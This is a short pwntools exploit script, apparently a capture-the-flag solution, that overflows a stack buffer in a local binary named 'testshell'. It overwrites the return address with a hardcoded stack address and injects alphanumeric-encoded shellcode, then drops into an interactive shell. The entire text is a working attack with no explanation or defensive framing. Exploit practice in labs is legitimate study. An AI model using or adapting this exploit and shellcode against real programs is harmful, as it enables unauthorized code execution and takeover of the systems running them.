from pwn import *

offset = 0xe
s = process('./testshell')
raw_input('debug')
shellcode = p32(0xffffd648+4)+'TX-SSSS-hSSS-IYYYP\%NNNN%0000-h-h%-h-h%-%Ub4P-hawa-5ernP-3w%w-ow%w-dk6YP-mAAA-mmAm-_QlRP-RzRR-Rzzz-ZhU3P-iii8-88i4-_pL2P'
payload = 'a'*offset+p32(0xffffd64c )+shellcode
s.sendline(payload)
s.interactive()
s.close()